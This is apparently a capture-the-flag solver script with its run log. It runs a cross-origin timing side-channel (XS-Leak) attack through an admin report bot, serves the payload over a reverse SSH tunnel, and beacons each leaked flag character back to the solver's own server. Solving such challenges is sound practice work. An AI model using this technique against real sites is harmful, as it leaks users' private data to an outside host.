#!/usr/bin/env python3
import asyncio
import json
import re
import signal
import socket
import subprocess
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import requests
from playwright.async_api import async_playwright


CHAL_BASE = "http://chal.polyuctf.com:47263"
STATE_FILE = Path("solver_LeakyCTF_Revenge.json")

TURNSTILE_WAIT = 120
BOT_WAIT = 90
HEX_LEN = 8

INTERNAL_FLAG_RE = re.compile(r"^leakyctf\{[0-9a-f]{8}\}$")
REAL_FLAG_RE = re.compile(r"PUCTF26\{[A-Za-z0-9_]+_[0-9A-Fa-f]{32}\}")

HTML_TEMPLATE = """<!doctype html>
<meta charset="utf-8">
<title>polyuctf one-process solver</title>
<body>solver</body>
<script>
const PREFIX = "__PREFIX__";
const TARGET = "http://localhost:5000/search?flag=";
const HEX = "0123456789abcdef";
const FAST_ACCEPT_GAP = 8.0;
const MIN_GOOD_SCORE = 10.0;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function median(vals) {
  const a = [...vals].sort((x, y) => x - y);
  return a[Math.floor(a.length / 2)];
}

async function beacon(path, obj) {
  const qs = new URLSearchParams(obj).toString();
  try {
    await fetch(path + "?" + qs, { mode: "no-cors", cache: "no-store" });
  } catch (e) {}
}

async function waitAccessible(win) {
  while (true) {
    try {
      void win.location.href;
      return;
    } catch (e) {}
    await sleep(2);
  }
}

async function probe(win, prefix) {
  win.location = "/blank?x=" + Math.random();
  await waitAccessible(win);

  const t0 = performance.now();
  win.location = TARGET + encodeURIComponent(prefix) + "&n=" + Math.random();

  while (true) {
    try {
      void win.location.href;
    } catch (e) {
      return performance.now() - t0;
    }
    await sleep(1);
  }
}

async function deltaOnce(win, prefix) {
  const hit = await probe(win, prefix);
  await sleep(15 + Math.floor(Math.random() * 10));
  const miss = await probe(win, prefix + "!");
  return { delta: miss - hit, hit, miss };
}

async function collect(win, prefix, rounds) {
  const ds = [];
  for (let i = 0; i < rounds; i++) {
    const r = await deltaOnce(win, prefix);
    ds.push(r.delta);
    await beacon("/progress", {
      msg: `sample prefix=${prefix} delta=${r.delta.toFixed(2)} hit=${r.hit.toFixed(2)} miss=${r.miss.toFixed(2)}`
    });
    await sleep(20 + Math.floor(Math.random() * 15));
  }
  return {
    prefix,
    ch: prefix[prefix.length - 1],
    deltas: ds,
    score: median(ds),
  };
}

async function main() {
  const win = window.open("/blank", "probe");
  if (!win) {
    await beacon("/progress", { msg: "popup blocked" });
    return;
  }

  await beacon("/progress", { msg: "start " + PREFIX });

  let results = [];
  for (const ch of shuffle(HEX.split(""))) {
    const prefix = PREFIX + ch;
    const r = await collect(win, prefix, 1);
    results.push(r);
  }

  results.sort((a, b) => b.score - a.score);
  await beacon("/progress", {
    msg: "rank1 " + results.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
  });

  const best = results[0];
  const second = results[1];
  if (!(best.score >= MIN_GOOD_SCORE && (best.score - second.score) >= FAST_ACCEPT_GAP)) {
    const finalists = [results[0], results[1], results[2]];
    let refined = [];

    for (const item of finalists) {
      const more = await collect(win, item.prefix, 2);
      const all = item.deltas.concat(more.deltas);
      refined.push({
        prefix: item.prefix,
        ch: item.ch,
        deltas: all,
        score: median(all),
      });
    }

    refined.sort((a, b) => b.score - a.score);
    results = refined.concat(results.slice(3));
    await beacon("/progress", {
      msg: "rank2 " + refined.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
    });
  }

  results.sort((a, b) => b.score - a.score);
  const winner = results[0];

  await beacon("/result", {
    ch: winner.ch,
    newprefix: PREFIX + winner.ch,
    score: winner.score.toFixed(2)
  });

  win.close();
}

main().catch(async (e) => {
  await beacon("/progress", { msg: "error " + String(e) });
});
</script>
"""


@dataclass
class State:
    logs: list[str] = field(default_factory=list)
    found_char: str | None = None
    new_prefix: str | None = None
    event: threading.Event = field(default_factory=threading.Event)

    def log(self, msg: str):
        line = f"[{time.strftime('%H:%M:%S')}] {msg}"
        self.logs.append(line)
        print(line, flush=True)


class Handler(BaseHTTPRequestHandler):
    state: State | None = None
    html: bytes = b""

    def log_message(self, fmt, *args):
        return

    def _send(self, body: bytes, status=200, ctype="text/html; charset=utf-8"):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/":
            return self._send(self.html)

        if parsed.path == "/blank":
            return self._send(b"<!doctype html><title>blank</title>")

        if parsed.path == "/progress":
            msg = qs.get("msg", [""])[0]
            if msg:
                self.state.log(msg)
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/result":
            ch = qs.get("ch", [""])[0]
            newprefix = qs.get("newprefix", [""])[0]
            score = qs.get("score", [""])[0]
            self.state.log(f"winner nibble={ch} newprefix={newprefix} score={score}")
            self.state.found_char = ch
            self.state.new_prefix = newprefix
            self.state.event.set()
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/logs":
            body = ("\n".join(self.state.logs)).encode()
            return self._send(body, ctype="text/plain; charset=utf-8")

        return self._send(b"not found", status=404, ctype="text/plain; charset=utf-8")


def load_state():
    if STATE_FILE.exists():
        return json.loads(STATE_FILE.read_text())
    return {"prefix": "leakyctf{"}


def save_state(obj):
    STATE_FILE.write_text(json.dumps(obj, indent=2))


def pick_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def start_server(state: State, html: bytes, port: int):
    Handler.state = state
    Handler.html = html
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def start_tunnel(port: int):
    proc = subprocess.Popen(
        [
            "ssh",
            "-T",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ServerAliveInterval=30",
            "-o", "ServerAliveCountMax=3",
            "-o", "LogLevel=ERROR",
            "-R", f"80:localhost:{port}",
            "nokey@localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    assert proc.stdout is not None
    deadline = time.time() + 30
    public_url = None

    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        print(line.rstrip(), flush=True)
        m = re.search(r"https://[A-Za-z0-9._-]+", line)
        if m:
            public_url = m.group(0)
            break

    if not public_url:
        proc.kill()
        raise RuntimeError("cannot obtain localhost.run URL")

    def drain():
        assert proc.stdout is not None
        for line in proc.stdout:
            print(line.rstrip(), flush=True)

    threading.Thread(target=drain, daemon=True).start()
    return proc, public_url


def terminate(proc):
    if proc is None or proc.poll() is not None:
        return
    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()


def fill_flags():
    print("[*] filling flags...", flush=True)
    for i in range(9):
        r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 100000}, timeout=20)
        print(f"    round {i+1}: {r.status_code} {r.text.strip()}", flush=True)
        if r.status_code == 400 and "exceed the maximum" in r.text:
            print("[*] flag store already full enough", flush=True)
            return
        time.sleep(1.05)

    r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 99999}, timeout=20)
    print(f"    final: {r.status_code} {r.text.strip()}", flush=True)
    if r.status_code == 400 and "exceed the maximum" in r.text:
        print("[*] flag store already full enough", flush=True)


async def get_turnstile_token():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled"],
        )
        page = await browser.new_page()
        try:
            await page.goto(f"{CHAL_BASE}/report", wait_until="load")
            print("[*] browser opened; solve Turnstile in the visible window", flush=True)

            locator = page.locator("#cf-turnstile-response")
            deadline = time.time() + TURNSTILE_WAIT

            while time.time() < deadline:
                try:
                    value = await locator.input_value()
                except Exception:
                    value = ""
                if value:
                    print(f"[*] got token len={len(value)}", flush=True)
                    return value
                await page.wait_for_timeout(1000)

            raise RuntimeError("timed out waiting for turnstile token")
        finally:
            await browser.close()


def submit_report(public_url: str):
    token = asyncio.run(get_turnstile_token())
    return requests.post(
        f"{CHAL_BASE}/report",
        data={"url": public_url, "answer": token},
        timeout=20,
    )


def submit_internal(flag: str):
    r = requests.get(f"{CHAL_BASE}/submit_flag", params={"flag": flag}, timeout=20)
    return r.status_code, r.text


def run_one_round(prefix: str):
    state = State()
    port = pick_port()
    html = HTML_TEMPLATE.replace("__PREFIX__", prefix).encode()

    httpd = start_server(state, html, port)
    tunnel_proc = None

    try:
        print(f"[*] local server on 127.0.0.1:{port}", flush=True)
        tunnel_proc, public_url = start_tunnel(port)
        print(f"[*] public url: {public_url}", flush=True)

        r = submit_report(public_url)
        print(f"[*] report(token) -> {r.status_code} {r.text.strip()}", flush=True)

        if r.status_code not in (200, 504):
            raise RuntimeError(f"report failed: {r.status_code}")

        if not state.event.wait(BOT_WAIT):
            raise RuntimeError("timed out waiting for winner nibble")

        if not state.new_prefix:
            raise RuntimeError("did not receive new prefix")

        return state.new_prefix
    finally:
        httpd.shutdown()
        httpd.server_close()
        terminate(tunnel_proc)


def main():
    st = load_state()
    prefix = st.get("prefix", "leakyctf{")
    print(f"[*] current prefix = {prefix}", flush=True)

    fill_flags()

    while len(prefix) < len("leakyctf{") + HEX_LEN:
        prefix = run_one_round(prefix)
        save_state({"prefix": prefix})
        print(f"[+] saved prefix = {prefix}", flush=True)

    internal_flag = prefix + "}"
    print(f"[+] internal flag = {internal_flag}", flush=True)

    if not INTERNAL_FLAG_RE.fullmatch(internal_flag):
        raise RuntimeError("internal flag format mismatch")

    code, text = submit_internal(internal_flag)
    print(f"[+] submit_flag status = {code}", flush=True)
    print(text, flush=True)

    m = REAL_FLAG_RE.search(text)
    if m:
        print(f"[+] real flag = {m.group(0)}", flush=True)
    else:
        print("[-] real flag not parsed from response", flush=True)


if __name__ == "__main__":
    main()


# Output
# [*] current prefix = leakyctf{
# [*] filling flags...
#     round 1: 200 Done adding flags. Total flags: 100001
#     round 2: 200 Done adding flags. Total flags: 200001
#     round 3: 200 Done adding flags. Total flags: 300001
#     round 4: 200 Done adding flags. Total flags: 400001
#     round 5: 200 Done adding flags. Total flags: 500001
#     round 6: 200 Done adding flags. Total flags: 600001
#     round 7: 200 Done adding flags. Total flags: 700001
#     round 8: 200 Done adding flags. Total flags: 800001
#     round 9: 200 Done adding flags. Total flags: 900001
#     final: 200 Done adding flags. Total flags: 1000000
# [*] local server on 127.0.0.1:57419
# authenticated as anonymous user
# 8beaa541ba3dc2.lhr.life tunneled with tls termination, https://8beaa541ba3dc2.lhr.life
# create an account and add your key for a longer lasting domain name. see https://localhost.run/docs/forever-free/ for more information.
# Open your tunnel address on your mobile with this QR:
# ...............   <= just keep reconnecting until you get the full leakyctf
# [*] public url: https://d488e70ee7c1d5.lhr.life
# [*] browser opened; solve Turnstile in the visible window
# [*] got token len=1029
# [02:35:40] start leakyctf{4c2c16f
# [02:35:41] sample prefix=leakyctf{4c2c16f2 delta=1.10 hit=39.70 miss=40.80
# [02:35:45] sample prefix=leakyctf{4c2c16f7 delta=1.20 hit=42.80 miss=44.00
# [*] report(token) -> 504 <html>
# <head><title>504 Gateway Time-out</title></head>
# <body>
# <center><h1>504 Gateway Time-out</h1></center>
# <hr><center>nginx/1.29.5</center>
# </body>
# </html>
# [02:35:50] sample prefix=leakyctf{4c2c16f8 delta=-0.60 hit=48.40 miss=47.80
# [02:35:54] sample prefix=leakyctf{4c2c16f9 delta=1.50 hit=48.00 miss=49.50
# [02:35:57] sample prefix=leakyctf{4c2c16f6 delta=1.40 hit=50.20 miss=51.60
# [02:36:00] sample prefix=leakyctf{4c2c16f0 delta=30.70 hit=23.60 miss=54.30
# [02:36:03] sample prefix=leakyctf{4c2c16fe delta=1.60 hit=54.90 miss=56.50
# [02:36:06] sample prefix=leakyctf{4c2c16fc delta=-1.90 hit=61.50 miss=59.60
# [02:36:10] sample prefix=leakyctf{4c2c16f5 delta=5.70 hit=60.80 miss=66.50
# [02:36:13] sample prefix=leakyctf{4c2c16fd delta=2.40 hit=63.20 miss=65.60
# [02:36:16] sample prefix=leakyctf{4c2c16f4 delta=0.60 hit=67.60 miss=68.20
# [02:36:19] sample prefix=leakyctf{4c2c16f3 delta=-0.80 hit=70.30 miss=69.50
# [02:36:25] sample prefix=leakyctf{4c2c16fb delta=2.70 hit=72.30 miss=75.00
# [02:36:29] sample prefix=leakyctf{4c2c16f1 delta=-1.10 hit=75.30 miss=74.20
# [02:36:32] sample prefix=leakyctf{4c2c16ff delta=4.40 hit=75.10 miss=79.50
# [02:36:36] sample prefix=leakyctf{4c2c16fa delta=-2.50 hit=82.90 miss=80.40
# [02:36:37] rank1 0:30.70, 5:5.70, f:4.40, b:2.70, d:2.40, e:1.60, 9:1.50, 6:1.40, 7:1.20, 2:1.10, 4:0.60, 8:-0.60, 3:-0.80, 1:-1.10, c:-1.90, a:-2.50
# [02:36:38] winner nibble=0 newprefix=leakyctf{4c2c16f0 score=30.70
# [+] saved prefix = leakyctf{4c2c16f0
# [+] internal flag = leakyctf{4c2c16f0}
# [+] submit_flag status = 200
# Correct! The real flag is: PUCTF26{Please_do_not_use_an_unintended_solution_to_solve_this_challenge_xddd_B4zcqTrZIbokHErpfzVtzUWw5d7we7NU}
# [-] real flag not parsed from response